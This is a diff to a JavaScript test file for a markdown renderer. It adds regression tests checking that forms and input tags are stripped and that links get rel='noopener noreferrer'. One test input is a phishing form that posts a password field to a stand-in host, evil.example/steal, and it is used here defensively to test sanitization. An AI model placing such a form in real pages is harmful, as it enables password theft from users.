@@ -15,7 +15,7 @@ describe('renderMarkdown', () => {
 
     expect(html).toContain('<li>one</li>')
     expect(html).toContain('<li>two</li>')
-    expect(html).toContain('<a href="https://example.com">link</a>')
+    expect(html).toContain('<a href="https://example.com" rel="noopener noreferrer">link</a>')
   })
 
   // Regression test for issue #27: unsanitized markdown/HTML input must
@@ -63,5 +63,26 @@ describe('renderMarkdown', () => {
 
   it('returns an empty string for empty input', () => {
     expect(renderMarkdown('')).toBe('')
+  })
+
+  // Regression test: DOMPurify's default config keeps <form>/<input>,
+  // which without CSP form-action would let a hostile document render a
+  // working phishing form inside the preview pane.
+  it('strips <form> and form-control tags entirely', () => {
+    const html = renderMarkdown(
+      '<form action="https://evil.example/steal" method="post"><input name="pw"><button>Go</button></form>',
+    )
+
+    expect(html).not.toContain('<form')
+    expect(html).not.toContain('<input')
+    expect(html).not.toContain('<button')
+    expect(html).not.toContain('evil.example')
+  })
+
+  it('adds rel="noopener noreferrer" to every link', () => {
+    const html = renderMarkdown('[a](https://a.example) and [b](https://b.example)')
+
+    expect(html).toContain('href="https://a.example" rel="noopener noreferrer"')
+    expect(html).toContain('href="https://b.example" rel="noopener noreferrer"')
   })
 })
